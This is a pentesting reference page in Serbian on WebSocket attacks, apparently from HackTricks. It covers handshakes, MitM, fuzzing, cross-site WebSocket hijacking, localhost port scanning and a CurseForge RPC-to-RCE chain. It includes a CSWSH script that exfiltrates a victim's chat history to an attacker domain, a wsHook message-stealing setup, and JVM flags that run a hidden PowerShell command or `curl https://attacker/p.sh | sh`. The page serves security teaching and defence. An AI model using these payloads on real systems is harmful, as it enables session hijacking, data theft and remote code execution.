# WebSocket Attacks

{{#include ../banners/hacktricks-training.md}}

## Šta su WebSockets

WebSocket konekcije se uspostavljaju kroz početni **HTTP** handshake i dizajnirane su da budu **dugotrajne**, omogućavajući dvosmerno slanje poruka u bilo kom trenutku bez potrebe za transakcionim sistemom. Ovo čini WebSockets posebno pogodnim za aplikacije koje zahtevaju **nisku latenciju ili komunikaciju pokrenutu od strane servera**, kao što su tokovi uživo finansijskih podataka.

### Uspostavljanje WebSocket konekcija

Detaljno objašnjenje o uspostavljanju WebSocket konekcija može se naći [**here**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc). Ukratko, WebSocket konekcije se obično iniciraju putem JavaScript-a na klijentskoj strani, kao što je prikazano ispod:
```javascript
var ws = new WebSocket("wss://normal-website.com/ws")
```
Protokol `wss` označava WebSocket konekciju zaštićenu pomoću **TLS**, dok `ws` označava **nezaštićenu** konekciju.

Tokom uspostavljanja veze, handshake se obavlja između browser-a i server-a preko HTTP-a. Proces handshake-a podrazumeva da browser pošalje zahtev, a server odgovori, što je prikazano u sledećim primerima:

Browser šalje handshake zahtev:
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
Odgovor servera na handshake:
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
Veza ostaje otvorena za razmenu poruka u oba smera nakon što je uspostavljena.

**Ključne tačke WebSocket handshaka:**

- Zaglavlja `Connection` i `Upgrade` signaliziraju početak WebSocket handshaka.
- Zaglavlje `Sec-WebSocket-Version` označava željenu verziju WebSocket protokola, obično `13`.
- U zaglavlju `Sec-WebSocket-Key` šalje se nasumična vrednost enkodirana u Base64, što osigurava da je svaki handshake jedinstven i pomaže u sprečavanju problema sa caching proxy-ima. Ova vrednost nije za autentifikaciju već služi da potvrdi da odgovor nije generisan od strane pogrešno konfigurisanog servera ili cache-a.
- Zaglavlje `Sec-WebSocket-Accept` u odgovoru servera je hash vrednosti iz `Sec-WebSocket-Key`, čime se verifikuje namera servera da otvori WebSocket konekciju.

Ove karakteristike obezbeđuju da je proces handshaka siguran i pouzdan, omogućavajući efikasnu komunikaciju u realnom vremenu.

### Linux konzola

Možete koristiti `websocat` da uspostavite raw konekciju sa websocket-om.
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
Ili da kreirate websocat server:
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### MitM websocket veze

Ako otkrijete da su klijenti povezani na **HTTP websocket** iz vaše trenutne lokalne mreže, možete pokušati [ARP Spoofing Attack ](../generic-methodologies-and-resources/pentesting-network/index.html#arp-spoofing) da izvedete MitM napad između klijenta i servera.\
Kada se klijent pokuša povezati sa vama, možete koristiti:
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### Websockets enumeracija

Možete koristiti **alat** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) **da automatski otkrijete, fingerprint i pretražite poznate** **vulnerabilities** u websockets.

### Websocket alati za debug

- **Burp Suite** podržava MitM websockets komunikaciju na vrlo sličan način kao i za regularnu HTTP komunikaciju.
- The [**socketsleuth**](https://github.com/snyk/socketsleuth) **Burp Suite extension** će vam omogućiti bolje upravljanje Websocket komunikacijama u Burpu dobijanjem **history**, postavljanjem **interception rules**, korišćenjem **match and replace** rules, kao i korišćenjem **Intruder** i **AutoRepeater.**
- [**WSSiP**](https://github.com/nccgroup/wssip)**:** Skraćeno za "**WebSocket/Socket.io Proxy**", ovaj alat, napisan u Node.js, pruža korisnički interfejs za **capture, intercept, slanje custom poruka** i pregled svih WebSocket i Socket.IO komunikacija između klijenta i servera.
- [**wsrepl**](https://github.com/doyensec/wsrepl) je **interactive websocket REPL** dizajniran posebno za pentesting. Pruža interfejs za posmatranje **incoming websocket messages i slanje novih**, sa jednostavnim frameworkom za **automatizaciju** ove komunikacije.
- [**https://websocketking.com/**](https://websocketking.com/) je **web alat za komunikaciju** sa drugim web-ovima koristeći **websockets**.
- [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket) — između ostalih tipova komunikacija/protokola, pruža **web alat za komunikaciju** sa drugim web-ovima koristeći **websockets.**

## Dešifrovanje Websocket

- [https://github.com/Anof-cyber/PyCript](https://github.com/Anof-cyber/PyCript)
- [https://github.com/Anof-cyber/PyCript-WebSocket/](https://github.com/Anof-cyber/PyCript-WebSocket/)

## Websocket laboratorija

U [**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course) imate kod za pokretanje weba koji koristi websockets, a u [**this post**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/) možete naći objašnjenje.

## Websocket Fuzzing

Burp ekstenzija [**Backslash Powered Scanner**](https://github.com/PortSwigger/backslash-powered-scanner) sada omogućava fuzz i WebSocket poruka. Više informacija možete pročitati [**here**](https://arete06.com/posts/fuzzing-ws/#adding-websocket-support-to-backslash-powered-scanner).

### WebSocket Turbo Intruder (Burp ekstenzija)

PortSwigger-ov WebSocket Turbo Intruder donosi Turbo Intruder–style Python skriptovanje i high‑rate fuzzing za WebSockets. Instalirajte ga iz BApp Store ili iz izvornog koda. Sadrži dve komponente:

- Turbo Intruder: high‑volume messaging do jedne WS endpoint koristeći custom engines.
- HTTP Middleware: izlaže lokalni HTTP endpoint koji prosleđuje bodies kao WS poruke preko perzistentne konekcije, tako da bilo koji HTTP‑bazirani skener može probe-ovati WS backende.

Osnovni obrazac skripta za fuzz-ovanje WS endpoint-a i filtriranje relevantnih odgovora:
```python
def queue_websockets(upgrade_request, message):
connection = websocket_connection.create(upgrade_request)
for i in range(10):
connection.queue(message, str(i))

def handle_outgoing_message(websocket_message):
results_table.add(websocket_message)

@MatchRegex(r'{\"user\":\"Hal Pline\"')
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
Koristite dekoratore kao `@MatchRegex(...)` da smanjite šum kada jedna poruka pokrene više odgovora.

### Most između WS i HTTP (HTTP Middleware)

Omotajte postojanu WS konekciju i prosleđujte HTTP body-je kao WS poruke za automatizovano testiranje sa HTTP skenerima:
```python
def create_connection(upgrade_request):
connection = websocket_connection.create(upgrade_request)
return connection

@MatchRegex(r'{\"user\":\"You\"')
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
Zatim pošaljite HTTP lokalno; telo se prosleđuje kao WS poruka:
```http
POST /proxy?url=https%3A%2F%2Ftarget/ws HTTP/1.1
Host: 127.0.0.1:9000
Content-Length: 16

{"message":"hi"}
```
Ovo vam omogućava da upravljate WS backendima dok filtrirate „zanimljive” događaje (npr. SQLi errors, auth bypass, command injection behavior).

### Socket.IO rukovanje (handshake, heartbeats, events)

Socket.IO dodaje sopstveni framing na vrhu WS. Prepoznajte ga po obaveznom query parametru `EIO` (npr. `EIO=4`). Održavajte sesiju aktivnom sa Ping (`2`) i Pong (`3`) i započnite komunikaciju sa `"40"`, zatim emitujte događaje poput `42["message","hello"]`.

Intruder primer:
```python
import burp.api.montoya.http.message.params.HttpParameter as HttpParameter

def queue_websockets(upgrade_request, message):
connection = websocket_connection.create(
upgrade_request.withUpdatedParameters(HttpParameter.urlParameter("EIO", "4")))
connection.queue('40')
connection.queue('42["message","hello"]')

@Pong("3")
def handle_outgoing_message(websocket_message):
results_table.add(websocket_message)

@PingPong("2", "3")
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
Varijanta HTTP adaptera:
```python
import burp.api.montoya.http.message.params.HttpParameter as HttpParameter

def create_connection(upgrade_request):
connection = websocket_connection.create(
upgrade_request.withUpdatedParameters(HttpParameter.urlParameter("EIO", "4")))
connection.queue('40')
connection.decIn()
return connection

@Pong("3")
def handle_outgoing_message(websocket_message):
results_table.add(websocket_message)

@PingPong("2", "3")
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
### Otkrivanje server‑side prototype pollution via Socket.IO

Prateći PortSwigger’s tehniku bezbednog otkrivanja, pokušajte zatrovati Express internals slanjem payload-a kao:
```json
{"__proto__":{"initialPacket":"Polluted"}}
```
Ako se pozdravi ili ponašanje promene (npr. echo uključuje "Polluted"), verovatno ste pollovali server-side prototypes. Uticaj zavisi od reachable sinks; korrelirajte sa gadgets u Node.js prototype pollution sekciji. See:

- Check [NodeJS – __proto__ & prototype Pollution](deserialization/nodejs-proto-prototype-pollution/README.md) for sinks/gadgets and chaining ideas.

### WebSocket race conditions with Turbo Intruder

Podrazumevani engine grupiše poruke preko jedne konekcije (dobar throughput, loš za race uslove). Koristite THREADED engine da spawn-ujete više WS konekcija i šaljete payloads paralelno kako biste pokrenuli logic races (double‑spend, token reuse, state desync). Počnite od example script i podesite concurrency u `config()`.

- Learn methodology and alternatives in [Race Condition](race-condition.md) (see “RC in WebSockets”).

### WebSocket DoS: malformed frame “Ping of Death”

Kreirajte WS frame-ove čiji header navodi ogromnu payload dužinu, ali ne pošaljete telo. Neki WS serveri veruju deklarisanoj dužini i pre-allocate-uju buffere; postavljanje vrednosti blizu `Integer.MAX_VALUE` može izazvati Out‑Of‑Memory i remote unauth DoS. See the example script.

### CLI and debugging

- Headless fuzzing: `java -jar WebSocketFuzzer-<version>.jar <scriptFile> <requestFile> <endpoint> <baseInput>`
- Enable the WS Logger to capture and correlate messages using internal IDs.
- Use `inc*`/`dec*` helpers on `Connection` to tweak message ID handling in complex adapters.
- Decorators like `@PingPong`/`@Pong` and helpers like `isInteresting()` reduce noise and keep sessions alive.

### Operational safety

High‑rate WS fuzzing može otvoriti mnogo konekcija i poslati na hiljade poruka u sekundi. Malformed frame-ovi i visoke stope mogu izazvati stvarni DoS. Koristite samo tamo gde imate dozvolu.

## Cross-site WebSocket hijacking (CSWSH)

Cross-site WebSocket hijacking, poznat i kao cross-origin WebSocket hijacking, predstavlja specifičan slučaj [Cross-Site Request Forgery (CSRF)](csrf-cross-site-request-forgery.md) koji utiče na WebSocket handshakes. Ova ranjivost nastaje kada se WebSocket handshake-ovi autentifikuju isključivo putem HTTP cookies bez CSRF tokens ili sličnih sigurnosnih mera.

Napadači mogu iskoristiti ovo hostovanjem maliciozne web stranice koja inicira cross-site WebSocket konekciju ka ranjivoj aplikaciji. Kao rezultat, ta konekcija će se tretirati kao deo sesije žrtve u aplikaciji, iskorišćavajući nedostatak CSRF zaštite u mehanizmu upravljanja sesijama.

Da bi ovaj napad uspeo, potrebni su sledeći uslovi:

- websocket authentication mora biti cookie based
- cookie mora biti dostupan sa servera napadača (obično znači `SameSite=None`) i da nema Firefox Total Cookie Protection omogućene u Firefox-u i da u Chrome-u nisu blokirani third-party cookies
- websocket server ne sme proveravati origin konekcije (ili to mora biti zaobiđivo)

Takođe:

- Ako je autentifikacija zasnovana na lokalnoj konekciji (na localhost ili lokalnu mrežu) napad će biti moguć jer trenutno nijedna zaštita to ne zabranjuje (check [more info here](https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/))

### Simple Attack

Imajte na umu da prilikom establishing websocket konekcije cookie biva poslat serveru. Server može koristiti cookie da poveže svakog specific korisnika sa njegovom websocket session bazirano na poslatom cookie-ju.

Dakle, ako, na primer, websocket server vraća history of the conversation korisnika kada se pošalje poruka sa "READY", onda će simple XSS koja uspostavi konekciju (cookie će biti poslat automatski da autorizuje žrtvinog korisnika) i pošalje "READY" moći da retrieve-uje history of the conversation.
```html
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### Cross Origin + Cookie with a different subdomain

U ovom blog postu [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/) napadač je uspeo da **izvrši proizvoljan Javascript u subdomainu** domena u kome se odvijala web socket komunikacija. Pošto je bila **subdomain**, **cookie** je bio **poslat**, i pošto **Websocket nije pravilno proveravao Origin**, bilo je moguće komunicirati sa njim i **ukrasti tokens iz njega**.

### Krađa podataka od korisnika

Kopirajte web aplikaciju koju želite da lažno predstavljate (npr. .html fajlove) i u okviru skripta u kome se odvija websocket komunikacija dodajte ovaj kod:
```javascript
//This is the script tag to load the websocket hooker
;<script src="wsHook.js"></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function (data, url) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "client_msg?m=" + data, true)
xhttp.send()
}
wsHook.after = function (messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "server_msg?m=" + messageEvent.data, true)
xhttp.send()
return messageEvent
}
```
Sada preuzmite fajl `wsHook.js` sa [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook) i **sačuvajte ga u folderu sa web fajlovima**.\
Izlažući web aplikaciju i nateravši korisnika da se poveže na nju, moći ćete da ukradete poslate i primljene poruke preko websocket-a:
```javascript
sudo python3 -m http.server 80
```
### CSWSH zaštite

CSWSH napad se zasniva na tome da će se **korisnik povezati na malicioznu stranicu** koja će **otvoriti websocket konekciju** prema web stranici na kojoj je korisnik već prijavljen i autentifikovati se u njegovo ime, jer zahtev šalje korisnikove cookies.

Danas je vrlo lako sprečiti ovaj problem:

- **Provera Origin-a na websocket serveru**: websocket server treba uvek da proveri odakle se korisnik povezuje kako bi sprečio neočekivane stranice da se povežu.
- **Autentifikacioni token**: Umesto oslanjanja na cookie za autentifikaciju, websocket konekcija može koristiti token koji server generiše za korisnika i koji je nepoznat napadaču (npr. anti-CSRF token)
- **SameSite Cookie attribute**: Cookies sa `SameSite` vrednostima `Lax` ili `Strict` neće biti poslati sa spoljne napadačeve stranice ka serverskoj strani žrtve, stoga autentifikacija bazirana na cookie-ima neće uspeti. Napomena: Chrome sada podrazumevano postavlja vrednost **`Lax`** za cookies kojima ovaj flag nije eksplicitno postavljen, čineći ih sigurnijim po defaultu. Međutim, prvih 2 minuta nakon kreiranja cookie imaće vrednost **`None`**, što ga čini ranjivim tokom tog ograničenog perioda (takođe se očekuje da će ova mera u nekom trenutku biti uklonjena).
- **Firefox Total Cookie Protection**: Total Cookie Protection funkcioniše tako što izoluje cookies na sajtu na kojem su kreirani. U suštini svaki sajt ima svoju particiju za skladištenje cookie-a da bi se onemogućilo trećim stranama da povežu korisnikovu istoriju pregleda. Ovo čini **CSWSH neupotrebljivim**, jer napadačeva stranica neće imati pristup cookies.
- **Chrome third-party cookies block**: Ovo može takođe da spreči slanje cookie-a autentifikovanog korisnika websocket serveru čak i kada je `SameSite=None`.

### Abuziranje Localhost WebSocket-a i otkrivanje portova iz browsera

Desktop launcheri često pokreću pomoćne procese (npr. CurseForge-ov `CurseAgent.exe`) koji otvaraju JSON-RPC WebSockets na `127.0.0.1:<random_port>`. Browser **ne primenjuje SOP na loopback sockets**, tako da bilo koja web stranica može pokušati handshake. Ako agent prihvata proizvoljne `Origin` vrednosti i preskače sekundarnu autentifikaciju, IPC površina postaje moguće daljinski kontrolisati direktno iz JavaScript-a.

#### Enumerisanje izloženih metoda

Snimite legitimnu sesiju da biste saznali ugovor protokola. CurseForge, na primer, emituje frejmove kao `{"type":"method","name":"minecraftTaskLaunchInstance","args":[{...}]}` gde je `name` RPC metoda, a `args` sadrži strukturirane objekte (GUID-ove, rezoluciju, flagove itd.). Kada je ova struktura poznata, možete pozivati metode kao što su `createModpack`, `minecraftGetDefaultLocation` ili bilo koji drugi privilegovani zadatak direktno sa injektovane stranice.

#### Otkrivanje portova iz browsera

Pošto helper vezuje za nasumičan visok port, exploit prvo brute-force-uje localhost preko WebSockets. Chromium-based browseri tolerišu ~16k neuspešnih upgrade-ova pre nego što počnu da throttluju, što je dovoljno da se pregazi ephemerni opseg; Firefox obično cršuje ili se zamrzne nakon nekoliko stotina neuspeha, pa praktični PoCs često ciljaju Chromium.

<details>
<summary>Minimalni browser skener</summary>
```javascript
async function findLocalWs(start = 20000, end = 36000) {
for (let port = start; port <= end; port++) {
await new Promise((resolve) => {
const ws = new WebSocket(`ws://127.0.0.1:${port}/`);
let settled = false;
const finish = () => { if (!settled) { settled = true; resolve(); } };
ws.onerror = ws.onclose = finish;
ws.onopen = () => {
console.log(`Found candidate on ${port}`);
ws.close();
finish();
};
});
}
}
```
</details>

Kada konekcija preživi handshake i vrati protokol-specifične podatke, ponovo iskoristite taj socket za RPC lanac.

#### Lančanje JSON-RPC metoda u RCE

CurseForge exploit povezuje dva neautentifikovana poziva:

1. `createModpack` → vraća novi `MinecraftInstanceGuid` bez interakcije korisnika.
2. `minecraftTaskLaunchInstance` → pokreće taj GUID i prihvata proizvoljne JVM flagove preko `AdditionalJavaArguments`.

JNI/JVM dijagnostičke opcije zatim pružaju gotov RCE primitiv. Na primer, ograničite metaspace da izazovete crash i iskoristite error hook za izvršavanje komandi:
```
-XX:MaxMetaspaceSize=16m -XX:OnOutOfMemoryError="cmd.exe /c powershell -nop -w hidden -EncodedCommand ..."
```
Na Unix ciljevima jednostavno zamenite payload sa `/bin/sh -c 'curl https://attacker/p.sh | sh'`. Ovo radi čak i kada ne možete da dirate kod aplikacije — kontrola JVM CLI je dovoljna.

Ovaj obrazac „create resource → privileged launch“ se često pojavljuje u updater-ima i launcher-ima. Svaki put kada metoda (1) proizvede server-pratjeni identifikator i metoda (2) izvrši kod ili pokrene proces sa tim identifikatorom, proverite da li se mogu ubrizgati argumenti pod kontrolom korisnika.


## Utrke (Race Conditions)

Utrke u WebSockets su takođe stvar, [pogledajte ove informacije za više detalja](race-condition.md#rc-in-websockets).

## Ostale ranjivosti

Pošto su Web Sockets mehanizam za **slanje podataka ka serveru i klijentu**, u zavisnosti od toga kako server i klijent obrađuju informacije, **Web Sockets se mogu koristiti za eksploataciju drugih ranjivosti kao što su XSS, SQLi ili bilo koja druga uobičajena web ranjivost koristeći unos korisnika preko websocket-a.**

## **WebSocket Smuggling**

Ova ranjivost može omogućiti da **zaobiđete ograničenja reverse proxies** tako što ćete ih navesti da veruju da je **websocket komunikacija uspostavljena** (čak i ako to nije tačno). To bi napadaču moglo omogućiti da **pristupi skrivenim endpoint-ima**. Za više informacija pogledajte sledeću stranicu:


{{#ref}}
h2c-smuggling.md
{{#endref}}

## References

- [https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages)
- [https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/](https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocket Turbo Intruder – BApp Store](https://portswigger.net/bappstore/ba292c5982ea426c95c9d7325d9a1066)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [Turbo Intruder background](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack)
- [Server-side prototype pollution – safe detection methods](https://portswigger.net/research/server-side-prototype-pollution#safe-detection-methods-for-manual-testers)
- [WS RaceCondition PoC (Java)](https://github.com/redrays-io/WS_RaceCondition_PoC)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)
- [PingOfDeathExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/PingOfDeathExample.py)
- [When WebSockets Lead to RCE in CurseForge](https://elliott.diy/blog/curseforge/)

{{#include ../banners/hacktricks-training.md}}
